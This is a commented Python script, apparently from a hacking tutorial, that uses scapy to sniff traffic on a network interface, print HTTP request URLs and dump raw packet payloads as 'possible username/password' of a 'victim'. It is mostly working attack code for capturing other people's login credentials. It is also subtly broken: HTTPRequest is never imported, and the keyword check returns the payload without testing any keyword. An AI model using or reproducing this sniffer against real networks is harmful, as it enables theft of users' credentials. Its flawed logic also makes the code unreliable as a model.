#! /usr/bin/python3

#scapy lets us probe, scan or attack networks.
import scapy.all as scapy
#argparse allow us input arguments
import argparse

#function that creates arguments inputs for the user to enter the IP of the victim and the ip of the gateway
def get_argument():
    #We create an object of argparse
    parser = argparse.ArgumentParser()
    #We store the values of the interface 
    parser.add_argument("-i", "--interface", dest= "interface", help= "The interface you are using to connect to the network. EX eth0, wlan0")
    #store the input
    args = parser.parse_args()
    #We make sure the arguments are not empthy
    if not args.interface:
        #code to handle the error
        raise argparse.ArgumentTypeError("[-] Please specify the interface, use --help for more info")   
    else:
        #If everything is correct we return the arguments
        return args

#functions that capture packets or data of an interface
def sniff(interface):
    #this capture de packet of an specify interface, not sotring info in the memory
    scapy.sniff(iface= interface, store= False, prn= process_sniffed_packet)

#Fucntion that returns the url of a HTTP website
def get_url(packet):
    #return URL in a variable
    return packet[HTTPRequest].Host + packet[HTTPRequest].Path

#Function that return the login/password 
def get_login_info(packet):
     #check if there is any raw layer where programmers store passworrds and usernames
        if packet.haslayer(scapy.Raw):
            #we store the output of the layer raw
            load = packet[scapy.Raw].load
            #list of possible names of the login and password boxes
            keywords = ["username", "user", "login", "password", "pass" ]
            #iterate through all the owrs in the list to see if there is any keyword
            for keyword in keywords:
                #print the information sotred in the load varibale
                return load
                
#function that print the packet to the terminal
def process_sniffed_packet(packet):
    #we load the layer http
    scapy.load_layer('http')
    #check if there is any http request in the ouput
    if packet.haslayer(HTTPRequest):
        #variable that store the url of the website
        url = get_url(packet)
        #print the url in the terminal
        print("[+] HTTP Request >> " + url.decode())
        #variable that store username and password of a user
        login_info = get_login_info(packet)
        #we check if there is any information in the variable
        if login_info:
            #print the message
            print("\n\n[+] Possible username/password > " + login_info.decode() + "\n\n")
       

#sotred the values of the get argument function
args = get_argument()
#call the sniff function
sniff(args.interface)
